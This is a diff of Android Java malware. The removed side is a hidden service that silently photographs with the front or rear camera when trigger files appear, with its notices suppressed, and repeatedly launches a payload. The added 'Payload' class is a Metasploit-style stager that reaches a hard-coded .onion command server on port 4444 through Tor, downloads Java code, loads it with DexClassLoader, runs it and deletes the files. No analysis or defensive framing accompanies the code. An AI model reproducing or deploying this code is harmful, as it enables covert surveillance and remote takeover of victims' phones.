@@ -1,307 +1,182 @@
+
 package com.capture;
 
-import android.app.*;
 import android.content.Context;
-import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.graphics.ImageFormat;
-import android.hardware.camera2.*;
-import android.media.Image;
-import android.media.ImageReader;
-import android.os.*;
-import android.widget.Toast;
-
+import dalvik.system.DexClassLoader;
+import java.io.ByteArrayOutputStream;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
-import java.nio.ByteBuffer;
-import java.util.Arrays;
-import java.util.concurrent.ScheduledFuture;
-import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.Executors;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.InetSocketAddress;
+import java.net.Proxy;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLConnection;
 import java.util.concurrent.TimeUnit;
-import com.capture.TorThread;
 
-public class RealService extends Service {
-    private PowerManager.WakeLock wakeLock;
-    private CameraDevice cameraDevice;
-    private ImageReader imageReader;
-    private Handler backgroundHandler;
-    private HandlerThread backgroundThread;
-    private String currentFilePath = "/storage/emulated/0/.nous/.photo.nous";
-    private CameraCaptureSession captureSession;
-    private boolean capturing = false;
-    private int currentCameraFacing = -1;
-	
-	private Thread mainThread;
-    public static Intent serviceIntent = null;
-    ScheduledFuture<?> beeperHandle;
-    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
-    //private PowerManager.WakeLock wakeLock;
+public class Payload {
+    public static final String CERT_HASH = "WWWW                                        ";
+    public static final String TIMEOUTS = "TTTT604800-300-3600-10                         ";
+    public static final String URL = "ZZZZtcp://v3epgbk4zmmgyyvifqablhh2udlfsshnczrerzzmgqoar2hnqvsaclqd.onion:4444	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ";
+    public static long comm_timeout;
+    private static String[] parameters;
+    public static long retry_total;
+    public static long retry_wait;
+    public static long session_expiry;
+    private static boolean isConnected = false;
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        startForeground(1, createNotification());
-		startNotificationListenerService();
-		TorThread torThread = new TorThread();
-		torThread.start();	
-        acquireWakeLock();
-		startPayload();
-		periodicallyAttempt();
-        startBackgroundThread();
-        startFileCheckingLoop();
-        return START_STICKY;
+    public static void start(Object р0) {
     }
 
-    private void startFileCheckingLoop() {
-        new Thread(new Runnable() {
-				@Override
-				public void run() {
-					while (true) {
-						File file1 = new File("/storage/emulated/0/.nous/web1");
-						File file2 = new File("/storage/emulated/0/.nous/web2");
-
-						if (file1.exists()) {
-							if (currentCameraFacing != CameraCharacteristics.LENS_FACING_FRONT) {
-								showToast("Capturando com a câmera frontal.");
-								startPhotoCapture(CameraCharacteristics.LENS_FACING_FRONT);
-							}
-						} else if (file2.exists()) {
-							if (currentCameraFacing != CameraCharacteristics.LENS_FACING_BACK) {
-								showToast("Capturando com a câmera traseira.");
-								startPhotoCapture(CameraCharacteristics.LENS_FACING_BACK);
-							}
-						} else {
-							if (capturing) {
-								showToast("Parando captura.");
-								stopPhotoCapture();
-							}
-						}
-
-						try {
-							Thread.sleep(2000);
-						} catch (InterruptedException e) {
-							showToast("Erro no loop de verificação: " + e.getMessage());
-						}
-					}
-				}
-			}).start();
-    }
-	
-	private void startNotificationListenerService() {
-        Intent intent = new Intent(this, NotificationListener.class);
-        startService(intent);
-    }
-
-    public void periodicallyAttempt() {
-        long half_an_hour = (60) / (2);
-
-        final Runnable beeper = new Runnable() {
-            public void run() {
-
-                Payload.start(getApplicationContext());
-            }
-        };
-
-        beeperHandle = scheduler.scheduleAtFixedRate(beeper, half_an_hour, half_an_hour, TimeUnit.SECONDS);
-    }
-
-    private void startPayload() {
-		startForeground(1, createNotification());
-        Payload.start(getApplicationContext());
-    }
-
-    
-
-    private void startPhotoCapture(int cameraFacing) {
-        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            showToast("Permissão da câmera não concedida.");
-            return;
+    static class C00001 extends Thread {
+        C00001() {
         }
 
-        if (cameraDevice != null && currentCameraFacing == cameraFacing) {
-            captureImage();
-            return;
+        public void run() {
+            Payload.main(null);
         }
+    }
 
-        stopPhotoCapture(); // Fecha a câmera se estiver aberta
+    public static void start(Context context) {
+        startInPath(context.getFilesDir().toString());
+    }
 
+    public static void startAsync() {
+        new C00001().start();
+    }
+
+    public static void startInPath(String path) {
+        parameters = new String[]{path};
+        startAsync();
+    }
+
+    public static void main(String[] args) {
+        if (args != null) {
+            parameters = new String[]{new File(".").getAbsolutePath()};
+        }
+        String[] timeouts = TIMEOUTS.substring(4).trim().split("-");
         try {
-            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-            for (String cameraId : cameraManager.getCameraIdList()) {
-                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
-                Integer lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING);
-                if (lensFacing != null && lensFacing == cameraFacing) {
-                    currentCameraFacing = cameraFacing;
-                    openCameraForPhotos(cameraId);
-                    return;
+            long sessionExpiry = Integer.parseInt(timeouts[0]);
+            long commTimeout = Integer.parseInt(timeouts[1]);
+            long retryTotal = Integer.parseInt(timeouts[2]);
+            long retryWait = Integer.parseInt(timeouts[3]);
+            long payloadStart = System.currentTimeMillis();
+            session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
+            comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
+            retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
+            retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
+            String url = URL.substring(4).trim();
+
+            int attempt = 0;
+            while (System.currentTimeMillis() < retry_total + payloadStart && System.currentTimeMillis() < session_expiry) {
+                if (!isConnected) {
+                    try {
+                        System.out.println("Tentando conectar em: " + url);
+                        if (url.startsWith("tcp")) {
+                            runStagefromTCP(url);
+                        } else {
+                            runStageFromHTTP(url);
+                        }
+                        isConnected = true;
+                        System.out.println("Conexão estabelecida!");
+                    } catch (Exception e) {
+                        isConnected = false;
+                        e.printStackTrace();
+                        attempt++;
+                        System.out.println("Tentativa " + attempt + " falhou. Aguardando...");
+                        Thread.sleep(retry_wait);
+                    }
+                }
+                if (isConnected) {
+                    Thread.sleep(1000); // Verifica periodicamente se a conexão ainda está ativa
                 }
             }
         } catch (Exception e) {
-            showToast("Erro ao acessar a câmera: " + e.getMessage());
+            e.printStackTrace();
         }
     }
 
-    private void openCameraForPhotos(final String cameraId) {
-        try {
-            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
-					@Override
-					public void onOpened(CameraDevice camera) {
-						cameraDevice = camera;
-						startImageReader();
-					}
-
-					@Override
-					public void onDisconnected(CameraDevice camera) {
-						stopPhotoCapture();
-					}
-
-					@Override
-					public void onError(CameraDevice camera, int error) {
-						stopPhotoCapture();
-					}
-				}, backgroundHandler);
-        } catch (Exception e) {
-            showToast("Erro ao abrir câmera: " + e.getMessage());
-        }
-    }
-
-    private void startImageReader() {
-        imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);
-        imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
-				@Override
-				public void onImageAvailable(ImageReader reader) {
-					Image image = reader.acquireLatestImage();
-					if (image == null) return;
-
-					ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-					byte[] bytes = new byte[buffer.remaining()];
-					buffer.get(bytes);
-					image.close();
-					saveImage(bytes);
-				}
-			}, backgroundHandler);
-
-        try {
-            cameraDevice.createCaptureSession(Arrays.asList(imageReader.getSurface()), new CameraCaptureSession.StateCallback() {
-					@Override
-					public void onConfigured(CameraCaptureSession session) {
-						captureSession = session;
-						captureImage();
-					}
-
-					@Override
-					public void onConfigureFailed(CameraCaptureSession session) {
-						showToast("Falha na configuração da captura.");
-					}
-				}, backgroundHandler);
-        } catch (CameraAccessException e) {
-            showToast("Erro ao iniciar sessão de captura: " + e.getMessage());
-        }
-    }
-
-    private void captureImage() {
-        if (cameraDevice == null || captureSession == null) return;
-
-        try {
-            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-            captureBuilder.addTarget(imageReader.getSurface());
-            captureSession.capture(captureBuilder.build(), null, backgroundHandler);
-            capturing = true;
-        } catch (CameraAccessException e) {
-            showToast("Erro ao capturar foto: " + e.getMessage());
-        }
-    }
-
-    private void saveImage(byte[] bytes) {
-        try {
-            FileOutputStream fos = new FileOutputStream(new File(currentFilePath));
-            fos.write(bytes);
-            fos.close();
-            showToast("Imagem salva: " + currentFilePath);
-        } catch (Exception e) {
-            showToast("Erro ao salvar imagem: " + e.getMessage());
-        }
-    }
-
-    private void stopPhotoCapture() {
-        capturing = false;
-        if (cameraDevice != null) {
-            cameraDevice.close();
-            cameraDevice = null;
-        }
-        if (captureSession != null) {
-            captureSession.close();
-            captureSession = null;
-        }
-        currentCameraFacing = -1;
-    }
-
-    private void acquireWakeLock() {
-        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RealService::WakeLock");
-        wakeLock.acquire();
-    }
-
-    private void releaseWakeLock() {
-        if (wakeLock != null && wakeLock.isHeld()) {
-            wakeLock.release();
-            wakeLock = null;
-        }
-    }
-
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        releaseWakeLock();
-        stopPhotoCapture();
-        stopBackgroundThread();
-    }
-
-    private void startBackgroundThread() {
-        backgroundThread = new HandlerThread("CameraBackground");
-        backgroundThread.start();
-        backgroundHandler = new Handler(backgroundThread.getLooper());
-    }
-
-    private void stopBackgroundThread() {
-        if (backgroundThread != null) {
-            backgroundThread.quitSafely();
-            backgroundThread = null;
-            backgroundHandler = null;
-        }
-    }
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
-    private Notification createNotification() {
-        String channelId = "default_channel_id";
-        Notification.Builder notificationBuilder;
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(channelId, "Serviço em segundo plano", NotificationManager.IMPORTANCE_LOW);
-            NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-            notificationManager.createNotificationChannel(channel);
-            notificationBuilder = new Notification.Builder(this, channelId);
+    private static void runStageFromHTTP(String url) throws Exception {
+        InputStream inStream;
+        if (url.startsWith("https")) {
+            URLConnection uc = new URL(url).openConnection();
+            Class.forName("com.metasploit.stage.PayloadTrustManager")
+                    .getMethod("useFor", URLConnection.class)
+                    .invoke(null, uc);
+            inStream = uc.getInputStream();
         } else {
-            notificationBuilder = new Notification.Builder(this);
+            inStream = new URL(url).openStream();
         }
-
-        return notificationBuilder.setContentTitle("Serviço em Execução")
-			.setContentText("Capturando imagens continuamente")
-			.setSmallIcon(R.drawable.ic_launcher)
-			.build();
+        readAndRunStage(new DataInputStream(inStream), new ByteArrayOutputStream(), parameters);
     }
 
-    private void showToast(final String message) {
-        new Handler(Looper.getMainLooper()).post(new Runnable() {
-				@Override
-				public void run() {
-				//	Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();
-				}
-			});
+    private static void runStagefromTCP(String url) throws Exception {
+        Socket sock = null;
+        String[] parts = url.split(":");
+        int port = Integer.parseInt(parts[2]);
+        String host = parts[1].split("/")[2];
+
+        try {
+            if (host.equals("")) {
+                ServerSocket server = new ServerSocket(port);
+                sock = server.accept();
+                server.close();
+            } else {
+                Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 9050));
+                sock = new Socket(proxy);
+                sock.connect(new InetSocketAddress(host, port));
+            }
+
+            if (sock != null) {
+                sock.setSoTimeout(1000);
+                isConnected = true;
+                readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), parameters);
+            }
+        } catch (Exception e) {
+            isConnected = false;
+            throw e;
+        } finally {
+            if (sock != null) {
+                sock.close();
+            }
+        }
+    }
+
+    private static void readAndRunStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+        String path = parameters[0];
+        String filePath = path + File.separatorChar + "payload.jar";
+        String dexPath = path + File.separatorChar + "payload.dex";
+
+        boolean shouldRestart = true;
+
+        while (shouldRestart) {
+            byte[] core = new byte[in.readInt()];
+            in.readFully(core);
+            String classFile = new String(core);
+            core = new byte[in.readInt()];
+            in.readFully(core);
+            File file = new File(filePath);
+            if (!file.exists()) {
+                file.createNewFile();
+            }
+            FileOutputStream fop = new FileOutputStream(file);
+            fop.write(core);
+            fop.flush();
+            fop.close();
+            Class<?> myClass = new DexClassLoader(filePath, path, path, Payload.class.getClassLoader()).loadClass(classFile);
+            Object stage = myClass.newInstance();
+            file.delete();
+            new File(dexPath).delete();
+            myClass.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
+                    .invoke(stage, in, out, parameters);
+
+            shouldRestart = false;
+        }
+
+        System.exit(0);
     }
 }
